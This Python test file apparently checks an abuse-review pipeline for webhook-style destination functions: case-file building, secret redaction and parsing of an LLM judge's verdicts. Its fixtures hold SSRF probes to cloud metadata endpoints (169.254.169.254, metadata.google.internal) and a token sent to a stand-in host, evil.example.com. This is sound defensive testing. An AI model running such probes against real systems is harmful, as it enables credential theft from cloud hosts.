import json
from datetime import timedelta
from typing import Any

from unittest.mock import patch

from django.db import connection
from django.test import override_settings
from django.test.utils import CaptureQueriesContext
from django.utils import timezone

import httpx
from parameterized import parameterized

from posthog.models.activity_logging.activity_log import ActivityLog
from posthog.models.team.team import Team

from products.cdp.backend.abuse import case_file
from products.cdp.backend.abuse.case_file import build_case_file
from products.cdp.backend.abuse.judge import (
    Review,
    ReviewFailure,
    ReviewFailureReason,
    SuggestedAction,
    Verdict,
    review_case,
)
from products.cdp.backend.abuse.shadow import score
from products.cdp.backend.models.hog_functions.hog_function import HogFunction
from products.cdp.backend.test.abuse_support import SECRET_VALUE, AbuseClassificationTestCase

PROBE_FINDINGS = ["Fetches http://169.254.169.254/latest, a cloud metadata address."]
PROBE_REASON = "Destination fetches a cloud metadata address from a one-member org made minutes ago."
PROBE_VERDICT = {
    "findings": PROBE_FINDINGS,
    "verdict": "true_positive",
    "confidence": 0.93,
    "suggested_action": "deactivate_org",
    "admin_reason": PROBE_REASON,
}


def model_message(text: str, *, stop_reason: str = "end_turn", **extra: Any) -> dict[str, Any]:
    return {
        "id": "msg_test",
        "type": "message",
        "role": "assistant",
        "model": "claude-opus-4-8",
        "content": [{"type": "thinking", "thinking": "", "signature": "sig"}, {"type": "text", "text": text}],
        "stop_reason": stop_reason,
        "stop_sequence": None,
        "usage": {"input_tokens": 4200, "output_tokens": 300},
        **extra,
    }


class TestAbuseReview(AbuseClassificationTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.organization.created_at = timezone.now() - timedelta(minutes=90)
        self.organization.save()

    def log(self, hog_function: HogFunction, activity: str, **detail: Any) -> ActivityLog:
        return ActivityLog.objects.create(
            team_id=hog_function.team_id,
            organization_id=self.organization.id,
            scope="HogFunction",
            item_id=str(hog_function.id),
            activity=activity,
            detail={"name": hog_function.name, **detail},
        )

    def other_function(self, team: Team, **overrides: Any) -> HogFunction:
        return HogFunction.objects.create(
            **{"team": team, "name": "Other", "type": "destination", "hog": "return event", **overrides}
        )

    def case_of(self, hog_function: HogFunction) -> dict[str, Any]:
        hog_function.refresh_from_db()
        return json.loads(build_case_file(hog_function, score(hog_function)).to_json())

    def test_the_case_file_holds_the_function_its_history_the_account_and_the_org_functions(self) -> None:
        destination = self.create_destination()
        self.log(destination, "created")
        self.log(
            destination,
            "updated",
            changes=[
                {
                    "type": "HogFunction",
                    "action": "changed",
                    "field": "hog",
                    "before": "",
                    "after": "fetch('https://a.example.com')",
                },
                {"type": "HogFunction", "action": "changed", "field": "enabled", "before": False, "after": True},
            ],
        )
        self.log(
            destination,
            "tested",
            context={
                "hog": "fetch('http://10.0.0.1:8000')",
                "mock_async_functions": False,
                "request_origins": [f"https://site{index:02}.example.com" for index in range(25)]
                + ["http://169.254.169.254"],
            },
        )
        sibling_team = Team.objects.create(organization=self.organization, name="Second project")
        self.other_function(sibling_team, name="Deleted probe", hog="fetch('http://localhost:8000')", deleted=True)
        self.other_function(self.team, name="Paused", hog="fetch('https://api.example.com/x')", enabled=False)
        many_hosts = "".join(f"fetch('https://host{index:02}.example.com');" for index in range(25))
        self.other_function(self.team, name="Many hosts", hog=many_hosts + "fetch('http://localhost:8000')")
        self.other_function(
            self.team,
            name="Secret target",
            hog="fetch(inputs.url)",
            inputs_schema=[{"key": "url", "type": "string", "secret": True}],
            encrypted_inputs={"url": {"value": "http://169.254.169.254/latest"}},
        )

        case = self.case_of(destination)

        function = case["function"]
        assert function["name"] == "Order webhook"
        assert "169.254.169.254" in function["config"]["code"]
        assert "169.254.169.254" in function["named_hosts"]
        assert function["classification"]["rule_hits"] == ["internal_host"]
        assert function["classification"]["would_block"] is True
        assert function["classification"]["scores"]["runtime_escape"] == 0.8
        assert case["account"] == {
            "age_days": 0,
            "minutes_from_signup_to_save": 90,
            "has_active_subscription": None,
            "member_count": 1,
            "team_count": 2,
            "cdp_trust_score": None,
            "tier": "standard",
        }
        assert [(entry["activity"], entry["hosts"], entry["enabled"]) for entry in case["history"]] == [
            ("created", [], None),
            ("updated", ["a.example.com"], True),
            ("tested", ["10.0.0.1"], None),
        ]
        assert "fetch(" not in json.dumps(case["history"])
        assert case["history"][1]["changed_fields"] == ["hog", "enabled"]
        assert case["history"][2]["request_origins"][0] == "http://169.254.169.254"
        assert len(case["history"][2]["request_origins"]) == case_file.MAX_ORIGINS_PER_TEST
        assert case["history"][2]["request_origins_omitted"] == 26 - case_file.MAX_ORIGINS_PER_TEST
        assert case["org_functions"] == {
            "total": 4,
            "deleted": 1,
            "disabled": 3,
            "checked_for_rules": 4,
            "rule_hits": {"internal_host": 3},
        }

    def test_flagged_hosts_lead_the_capped_host_lists(self) -> None:
        many_hosts = "".join(f"fetch('https://host{index:02}.example.com');" for index in range(25))
        destination = self.create_destination(
            hog=many_hosts + "fetch('http://metadata.google.internal/computeMetadata/v1/')"
        )

        function = self.case_of(destination)["function"]
        request_hosts = function["classification"]["request_hosts"]

        assert function["named_hosts"][0] == "metadata.google.internal"
        assert len(function["named_hosts"]) == case_file.MAX_HOSTS_PER_FUNCTION
        assert function["named_hosts_omitted"] == 28 - case_file.MAX_HOSTS_PER_FUNCTION
        assert request_hosts[0] == "metadata.google.internal"
        assert len(request_hosts) == case_file.MAX_HOSTS_PER_FUNCTION
        assert function["classification"]["request_hosts_omitted"] == 28 - case_file.MAX_HOSTS_PER_FUNCTION

    def test_a_control_character_in_a_host_shows_as_a_visible_symbol(self) -> None:
        destination = self.create_destination(hog="fetch('http://a%01b.example.com/')")

        named_hosts = self.case_of(destination)["function"]["named_hosts"]

        assert "a\u2401b.example.com" in named_hosts
        assert not any("\x01" in host for host in named_hosts)

    @parameterized.expand(
        [
            (
                "literal_fetch_in_code",
                {},
                [{"rule": "internal_host", "location": "code", "host": "169.254.169.254", "request_target": True}],
                ["169.254.169.254", "collector.example.net", "hooks.example.com"],
            ),
            (
                "link_in_a_message_button",
                {
                    "hog": "fetch('https://slack.com/api/chat.postMessage', {'body': {'blocks': inputs.blocks}})",
                    "inputs_schema": [{"key": "blocks", "type": "json", "label": "Blocks"}],
                    "inputs": {"blocks": {"value": [{"type": "button", "url": "http://localhost:8000/runbook"}]}},
                    "mappings": [],
                    "masking": None,
                },
                [{"rule": "internal_host", "location": "input:blocks", "host": "localhost", "request_target": True}],
                ["localhost", "slack.com"],
            ),
            (
                "secret_input_only",
                {
                    "hog": "fetch(inputs.url)",
                    "inputs_schema": [{"key": "url", "type": "string", "label": "URL", "secret": True}],
                    "inputs": {},
                    "encrypted_inputs": {"url": {"value": "http://169.254.169.254/latest"}},
                    "mappings": [],
                    "masking": None,
                },
                [{"rule": "internal_host", "location": case_file.UNLOCATED, "host": None, "request_target": False}],
                [],
            ),
        ]
    )
    def test_each_rule_hit_shows_where_it_matched(
        self, _name: str, overrides: dict[str, Any], evidence: list[dict[str, Any]], request_hosts: list[str]
    ) -> None:
        destination = self.create_destination(**overrides)

        classification = self.case_of(destination)["function"]["classification"]

        assert classification["rule_evidence"] == evidence
        assert classification["request_hosts"] == request_hosts

    def test_the_evidence_cap_keeps_every_rule_hit(self) -> None:
        catchers = {f"a{index:02}": {"value": f"https://x{index:02}.webhook.site/"} for index in range(25)}
        destination = self.create_destination(
            hog="fetch(inputs.z_target)",
            inputs_schema=[{"key": key, "type": "string"} for key in [*catchers, "z_target"]],
            inputs={**catchers, "z_target": {"value": "http://169.254.169.254/latest"}},
            mappings=[],
            masking=None,
        )

        classification = self.case_of(destination)["function"]["classification"]

        assert {entry["rule"] for entry in classification["rule_evidence"]} == {"internal_host", "request_catcher"}
        assert len(classification["rule_evidence"]) == case_file.MAX_RULE_EVIDENCE
        assert classification["rule_evidence_omitted"] == 26 - case_file.MAX_RULE_EVIDENCE

    def test_no_secret_value_reaches_the_case_file(self) -> None:
        legacy_secret = "legacy-mapping-token-0042"
        destination = self.create_destination(
            # A secret input keeps its compiled bytecode, whose strings are ordinary names.
            inputs={
                "url": {"value": "https://hooks.example.com/orders"},
                "api_key": {"value": SECRET_VALUE, "bytecode": ["_H", 1, 32, "properties"]},
            },
            # Only top-level secrets move to the encrypted field, so an older mapping keeps its secret in plain text.
            mappings=[
                {
                    "name": "Orders",
                    "inputs_schema": [{"key": "token", "type": "string", "label": "Token", "secret": True}],
                    "inputs": {"token": {"value": legacy_secret}},
                }
            ],
        )
        # Code saved before the credential moved into a secret input.
        self.log(
            destination,
            "updated",
            changes=[
                {
                    "field": "hog",
                    "after": f"fetch('https://{SECRET_VALUE}.example.com/?key={SECRET_VALUE}');"
                    f"fetch('https://{SECRET_VALUE}@api.example.com/')",
                }
            ],
        )
        # The activity log masks inputs but not the inputs schema, whose secret default holds the value.
        self.log(
            destination,
            "updated",
            changes=[
                {
                    "type": "HogFunction",
                    "action": "changed",
                    "field": "inputs_schema",
                    "before": [],
                    "after": [{"key": "api_key", "secret": True, "default": SECRET_VALUE}],
                }
            ],
        )
        # The row redacts only the secrets stored when the test ran, so a secret saved after it is still in clear.
        self.log(
            destination,
            "tested",
            context={
                "hog": "fetch(inputs.url)",
                "request_origins": [
                    f"https://{SECRET_VALUE}.example.com",
                    f"https://{legacy_secret}.example.com",
                    f"https://{SECRET_VALUE}." + "a" * 60 + "." + ("b" * 60 + ".") * 5 + "example.com",
                ],
            },
        )
        secret_url = f"https://{SECRET_VALUE}.example.com/hook"
        self.other_function(
            self.team,
            inputs_schema=[{"key": "token", "type": "string", "secret": True, "default": SECRET_VALUE}],
            inputs={"token": {"value": secret_url}},
            encrypted_inputs={"token": {"value": secret_url}},
        )

        serialized = build_case_file(destination, score(destination)).to_json()

        assert SECRET_VALUE not in serialized
        assert legacy_secret not in serialized
        assert "https://hooks.example.com/orders" in serialized

    @parameterized.expand([("url", "https://{label}.example.com/hook"), ("bare_hostname", "{label}.example.com")])
    def test_a_secret_host_used_as_a_test_target_is_redacted_from_test_origins(self, _name: str, value: str) -> None:
        secret_label = "hooktoken0042secret"
        destination = self.create_destination(
            inputs_schema=[{"key": "url", "type": "string", "label": "URL", "secret": True}],
            inputs={"url": {"value": value.format(label=secret_label)}},
            mappings=[],
        )
        self.log(
            destination,
            "tested",
            context={"hog": "fetch(inputs.url)", "request_origins": [f"https://{secret_label}.example.com"]},
        )

        serialized = build_case_file(destination, score(destination)).to_json()

        assert secret_label not in serialized

    @parameterized.expand(
        [
            ("substring", "internal"),
            ("label", "google"),
            ("url_label", "https://google.example.org/hook"),
            ("whole_host", "metadata.google.internal"),
        ]
    )
    def test_a_planted_secret_cannot_hide_a_host_from_history(self, _name: str, decoy: str) -> None:
        destination = self.create_destination(
            hog="return event",
            inputs_schema=[{"key": "decoy", "type": "string", "label": "Decoy", "secret": True}],
            inputs={"decoy": {"value": decoy}},
            mappings=[],
            masking=None,
        )
        self.log(
            destination, "updated", changes=[{"field": "hog", "after": "fetch('http://metadata.google.internal/x')"}]
        )

        case = self.case_of(destination)

        assert case["history"][-1]["hosts"] == ["metadata.google.internal"]

    def test_a_short_secret_token_is_hidden_from_history_hosts_and_test_origins(self) -> None:
        token = "ab12cd34"
        destination = self.create_destination(
            hog="return event",
            inputs_schema=[{"key": "hook", "type": "string", "label": "Hook", "secret": True}],
            inputs={"hook": {"value": f"https://{token}.ngrok.example.com/hook"}},
            mappings=[],
            masking=None,
        )
        old_code = (
            f"fetch('http://{token}@evil.example.com/');fetch('https://{token}.relay.example.com/x');"
            f"fetch('https://relay-{token}.example.com/')"
        )
        self.log(destination, "updated", changes=[{"field": "hog", "after": old_code}])
        self.log(
            destination,
            "tested",
            context={"hog": "fetch(inputs.hook)", "request_origins": [f"https://{token}.ngrok.example.com"]},
        )

        serialized = build_case_file(destination, score(destination)).to_json()

        assert token not in serialized
        assert "relay.example.com" in serialized

    def test_a_long_config_with_a_long_history_keeps_its_hosts(self) -> None:
        padding = " ".join(f"w{index}" for index in range(12_000))
        destination = self.create_destination(hog=f"fetch('http://169.254.169.254/latest');\n// {padding}")
        for version in range(case_file.MAX_HISTORY_ENTRIES):
            code = "".join(f"fetch('https://v{version}h{index:02}{'a' * 200}.example.com');" for index in range(20))
            entry = self.log(destination, "updated", changes=[{"field": "hog", "after": code}])
            ActivityLog.objects.filter(pk=entry.pk).update(created_at=timezone.now() + timedelta(seconds=version))

        case = self.case_of(destination)

        assert len(json.dumps(case, ensure_ascii=False, separators=(",", ":"))) <= case_file.MAX_CASE_FILE_CHARS
        assert case["function"]["named_hosts"][0] == "169.254.169.254"
        assert case["function"]["classification"]["request_hosts"][0] == "169.254.169.254"
        assert case["history_omitted"] > 0
        assert case["history"][-1]["hosts"][0].startswith(f"v{case_file.MAX_HISTORY_ENTRIES - 1}h00")

    def test_the_org_function_check_costs_no_query_per_function(self) -> None:
        destination = self.create_destination()
        template = self.create_template("destination")

        def queries_with(other_functions: int) -> int:
            existing = HogFunction.objects.filter(team=self.team).exclude(pk=destination.pk).count()
            for index in range(other_functions - existing):
                self.other_function(
                    self.team,
                    name=f"Function {index}",
                    hog="fetch('http://localhost:8000')",
                    template_id=template.template_id,
                    hog_function_template=template,
                )
            destination.refresh_from_db()
            scored = score(destination)
            with CaptureQueriesContext(connection) as captured:
                build_case_file(destination, scored)
            return len(captured.captured_queries)

        assert queries_with(2) == queries_with(6)

    def test_history_and_the_org_function_check_are_capped_to_the_latest(self) -> None:
        destination = self.create_destination()
        for version in range(case_file.MAX_HISTORY_ENTRIES + 5):
            entry = self.log(
                destination, "updated", changes=[{"field": "hog", "after": f"fetch('https://v{version}.example.com')"}]
            )
            ActivityLog.objects.filter(pk=entry.pk).update(created_at=timezone.now() + timedelta(seconds=version))
        for index in range(case_file.MAX_ORG_FUNCTIONS_CHECKED + 3):
            self.other_function(self.team, name=f"Function {index}", hog="fetch('http://localhost:8000')")

        case = self.case_of(destination)

        assert len(case["history"]) == case_file.MAX_HISTORY_ENTRIES
        assert case["history_omitted"] == 5
        assert case["history"][0]["hosts"] == ["v5.example.com"]
        assert case["history"][-1]["hosts"] == [f"v{case_file.MAX_HISTORY_ENTRIES + 4}.example.com"]
        assert case["org_functions"]["total"] == case_file.MAX_ORG_FUNCTIONS_CHECKED + 3
        assert case["org_functions"]["checked_for_rules"] == case_file.MAX_ORG_FUNCTIONS_CHECKED
        assert case["org_functions"]["rule_hits"] == {"internal_host": case_file.MAX_ORG_FUNCTIONS_CHECKED}

    def test_an_oversized_case_file_drops_the_oldest_history_to_fit(self) -> None:
        destination = self.create_destination()
        for version in range(10):
            entry = self.log(
                destination,
                "updated",
                changes=[
                    {
                        "field": "hog",
                        "after": "".join(
                            f"fetch('https://v{version}h{index}{'a' * 90}.example.com');" for index in range(5)
                        ),
                    }
                ],
            )
            ActivityLog.objects.filter(pk=entry.pk).update(created_at=timezone.now() + timedelta(seconds=version))

        with patch.object(case_file, "MAX_CASE_FILE_CHARS", 6_000):
            destination.refresh_from_db()
            built = build_case_file(destination, score(destination))

        serialized = built.to_json()
        assert len(serialized) <= 6_000
        assert "169.254.169.254" in serialized
        assert 0 < len(built.history) < 10
        assert len(built.history) + built.history_omitted == 10
        assert built.history[-1].hosts[0].startswith("v9h0")

    @parameterized.expand(
        [
            ("host", {"hog": "fetch('http://" + "a" * 60 + "." + ("b" * 60 + ".") * 2_500 + "example.com/')"}),
            (
                "input_key",
                {
                    "hog": "fetch(inputs.url)",
                    "inputs_schema": [{"key": "k" * case_file.MAX_CASE_FILE_CHARS, "type": "string"}],
                    "inputs": {"k" * case_file.MAX_CASE_FILE_CHARS: {"value": "http://localhost:8000/"}},
                    "mappings": [],
                    "masking": None,
                },
            ),
            (
                "escaped_hosts_beside_a_full_config",
                {
                    "hog": "".join(f"fetch('http://h{index:02}{'%01' * 250}.example.com/');" for index in range(25))
                    + "\n// "
                    + " ".join(f"w{index}" for index in range(12_000)),
                },
            ),
        ]
    )
    def test_a_huge_name_cannot_push_the_history_out(self, _name: str, overrides: dict[str, Any]) -> None:
        destination = self.create_destination(**overrides)
        self.log(destination, "updated", changes=[{"field": "hog", "after": "fetch('http://127.0.0.1')"}])

        case = self.case_of(destination)

        assert len(json.dumps(case, ensure_ascii=False, separators=(",", ":"))) <= case_file.MAX_CASE_FILE_CHARS
        assert [entry["hosts"] for entry in case["history"]] == [["127.0.0.1"]]


class TestAbuseReviewJudge(AbuseClassificationTestCase):
    def setUp(self) -> None:
        super().setUp()
        destination = self.create_destination()
        self.case = build_case_file(destination, score(destination))
        self.gateway.requests.clear()

    def review(self) -> Review | ReviewFailure:
        return review_case(self.case, team_id=self.team.id)

    def test_a_verdict_is_parsed_from_one_private_unbilled_call(self) -> None:
        self.gateway.response = httpx.Response(200, json=model_message(json.dumps(PROBE_VERDICT)))

        result = self.review()

        assert result == Review(
            verdict=Verdict.TRUE_POSITIVE,
            confidence=0.93,
            findings=tuple(PROBE_FINDINGS),
            suggested_action=SuggestedAction.DEACTIVATE_ORG,
            admin_reason=PROBE_REASON,
            model="claude-opus-4-8",
            latency_ms=result.latency_ms if isinstance(result, Review) else 0.0,
            input_tokens=4200,
            output_tokens=300,
        )
        [request] = self.gateway.requests
        body = json.loads(request.content)
        assert request.url.path == "/v1/messages"
        assert request.headers["X-PostHog-Privacy-Mode"] == "true"
        assert request.headers["X-PostHog-Billable"] == "false"
        assert body["model"] == "claude-opus-4-8"
        assert body["output_config"]["format"]["schema"]["properties"]["verdict"]["enum"] == [
            "true_positive",
            "false_positive",
            "uncertain",
        ]
        assert "169.254.169.254" in body["messages"][0]["content"]
        assert SECRET_VALUE not in request.content.decode()

    @parameterized.expand(
        [
            ("not_json", model_message("The function looks malicious."), ReviewFailureReason.INVALID_ANSWER),
            (
                "unknown_verdict",
                model_message(json.dumps({**PROBE_VERDICT, "verdict": "malicious"})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            (
                "confidence_as_text",
                model_message(json.dumps({**PROBE_VERDICT, "confidence": "0.9"})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            (
                "confidence_above_one",
                model_message(json.dumps({**PROBE_VERDICT, "confidence": 1.5})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            (
                "six_findings",
                model_message(json.dumps({**PROBE_VERDICT, "findings": ["seen"] * 6})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            (
                "action_without_a_true_positive",
                model_message(json.dumps({**PROBE_VERDICT, "verdict": "uncertain"})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            (
                "reason_over_two_lines",
                model_message(json.dumps({**PROBE_VERDICT, "admin_reason": "first\nsecond"})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            (
                "extra_field",
                model_message(json.dumps({**PROBE_VERDICT, "notes": "x"})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            (
                "no_findings",
                model_message(json.dumps({**PROBE_VERDICT, "findings": []})),
                ReviewFailureReason.INVALID_ANSWER,
            ),
            ("cut_off", model_message('{"findings": ["Fetch', stop_reason="max_tokens"), ReviewFailureReason.TRUNCATED),
            (
                "context_window_full",
                model_message("", stop_reason="model_context_window_exceeded"),
                ReviewFailureReason.TRUNCATED,
            ),
        ]
    )
    def test_an_unusable_answer_is_a_typed_failure(
        self, _name: str, message: dict[str, Any], reason: ReviewFailureReason
    ) -> None:
        self.gateway.response = httpx.Response(200, json=message)

        assert self.review() == ReviewFailure(reason=reason)

    @parameterized.expand(
        [
            (
                "json_type_not_json",
                httpx.Response(200, content=b"<html>", headers={"content-type": "application/json"}),
            ),
            ("html_page", httpx.Response(200, content=b"<html>", headers={"content-type": "text/html"})),
            ("empty_object", httpx.Response(200, json={})),
            ("no_usage", httpx.Response(200, json={**model_message(json.dumps(PROBE_VERDICT)), "usage": {}})),
        ]
    )
    def test_a_reply_that_is_not_a_message_is_a_typed_failure(self, _name: str, reply: httpx.Response) -> None:
        self.gateway.response = reply

        assert self.review() == ReviewFailure(reason=ReviewFailureReason.INVALID_ANSWER)

    def reply_in_turn(self, *replies: httpx.Response) -> None:
        queue = list(replies)

        def handle(request: httpx.Request) -> httpx.Response:
            self.gateway.requests.append(request)
            return queue.pop(0)

        patcher = patch.object(self.gateway, "handle", new=handle)
        patcher.start()
        self.addCleanup(patcher.stop)

    def asked_models(self) -> list[str]:
        return [json.loads(request.content)["model"] for request in self.gateway.requests]

    def test_an_invalid_answer_is_asked_again_once(self) -> None:
        invalid = model_message(json.dumps({**PROBE_VERDICT, "findings": ["seen"] * 6}))
        self.reply_in_turn(
            httpx.Response(200, json=invalid), httpx.Response(200, json=model_message(json.dumps(PROBE_VERDICT)))
        )

        result = self.review()

        assert isinstance(result, Review)
        assert result.verdict is Verdict.TRUE_POSITIVE
        assert self.asked_models() == ["claude-opus-4-8", "claude-opus-4-8"]

    def test_a_refusal_keeps_its_category_and_is_not_asked_again(self) -> None:
        self.gateway.response = httpx.Response(
            200,
            json=model_message("", stop_reason="refusal", stop_details={"type": "refusal", "category": "cyber"}),
        )

        assert self.review() == ReviewFailure(reason=ReviewFailureReason.REFUSED, refusal_category="cyber")
        assert self.asked_models() == ["claude-opus-4-8"]

    def test_a_gateway_error_is_a_typed_failure(self) -> None:
        self.gateway.response = httpx.Response(400, json={"type": "error", "error": {"type": "invalid_request_error"}})

        assert self.review() == ReviewFailure(reason=ReviewFailureReason.GATEWAY_ERROR)

    @override_settings(AI_GATEWAY_URL="", AI_GATEWAY_API_KEY="")
    def test_an_unconfigured_gateway_is_a_typed_failure(self) -> None:
        assert self.review() == ReviewFailure(reason=ReviewFailureReason.NOT_CONFIGURED)
        assert self.gateway.requests == []
